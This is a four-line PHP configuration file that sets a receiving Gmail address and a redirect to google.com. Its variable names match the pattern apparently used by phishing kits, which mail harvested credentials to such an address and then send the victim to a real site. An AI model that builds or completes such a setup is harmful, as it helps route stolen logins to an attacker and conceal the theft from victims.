<?php 
$Receive_email="kateebnerr@gmail.com";
$redirect="https://www.google.com/";
?>